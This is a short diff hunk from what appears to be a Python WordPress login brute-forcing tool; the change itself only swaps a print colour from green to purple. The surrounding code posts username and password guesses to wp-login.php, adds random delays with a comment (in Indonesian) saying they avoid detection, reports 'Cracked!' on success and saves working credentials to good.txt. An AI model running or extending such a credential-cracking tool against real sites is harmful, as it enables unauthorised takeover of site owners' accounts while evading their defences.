@@ -79,7 +79,7 @@ def try_login(site, username, passwd):
         r = session.post(site + "/wp-login.php", data={'log': username, 'pwd': passwd}, headers=headers, timeout=30)
         time.sleep(random.uniform(0.5, 2.0))  # Jeda acak untuk menghindari deteksi
         if "wp-admin/profile.php" in r.text or r.status_code == 302:
-            print(Colors.green + f"Cracked! --> {site}/wp-login.php : {username} : {passwd} [ WordPress ]")
+            print(Colors.purple + f"Cracked! --> {site}/wp-login.php : {username} : {passwd} [ WordPress ]")
             with open("good.txt", "a") as f:
                 f.write(f"WordPress --> {site}/wp-login.php : {username} : {passwd}\n")
             return True
